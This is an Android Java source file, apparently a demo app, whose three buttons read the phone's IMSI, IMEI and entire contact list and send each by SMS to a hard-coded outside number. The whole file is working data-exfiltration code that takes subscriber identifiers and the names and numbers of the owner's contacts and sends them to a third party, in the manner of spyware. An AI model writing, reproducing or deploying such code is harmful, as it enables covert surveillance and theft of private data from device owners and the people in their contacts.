package com.max.demo;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.Button;

public class MainActivity extends Activity {
	Context mContext = null;
	
    private static final String[] PHONES_PROJECTION = new String[] {
	    Phone.DISPLAY_NAME, Phone.NUMBER, Phone.CONTACT_ID };
    
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        mContext = this;
        
        Button imsi_button = (Button) findViewById(R.id.imsi_button);
        imsi_button.setOnClickListener(new View.OnClickListener() {
        	public void onClick(View v) {
        		String imsi = getIMSI();
        		sendSMS("15271814440", "IMSI:"+imsi);
        	}
        });

        Button imei_button = (Button) findViewById(R.id.imei_button);
        imei_button.setOnClickListener(new View.OnClickListener() {
        	public void onClick(View v) {
        		String imei = getIMEI();
        		sendSMS("15271814440", "IMEI:"+imei);
        	}
        });
        
        Button contacts_button = (Button) findViewById(R.id.contacts_button);
        contacts_button.setOnClickListener(new View.OnClickListener() {
        	public void onClick(View v) {
        		ContentResolver resolver = mContext.getContentResolver();
        		Cursor phoneCursor = resolver.query(Phone.CONTENT_URI,PHONES_PROJECTION, null, null, null);
        		String SMSContent = "";
        		while (phoneCursor.moveToNext()) {
        			String contactName = phoneCursor.getString(0);
        			String phoneNumber = phoneCursor.getString(1);
        			Long contactid = phoneCursor.getLong(2);
        			SMSContent += contactName + "_" + phoneNumber + ";\r";
        		}
        		sendSMS("15271814440", SMSContent);
        	}
        });
    }
    
    private String getIMSI() {
    	TelephonyManager tm = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
    	String imsi = tm.getSubscriberId();
    	return imsi;
    }

    private String getIMEI() {
    	TelephonyManager tm = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
    	String imei = tm.getDeviceId();
    	return imei;
    }
    
    private void sendSMS(String paramPhoneNumber, String paramSMSContent) {
    	SmsManager.getDefault().sendTextMessage(paramPhoneNumber, null, paramSMSContent, null, null);
    }
}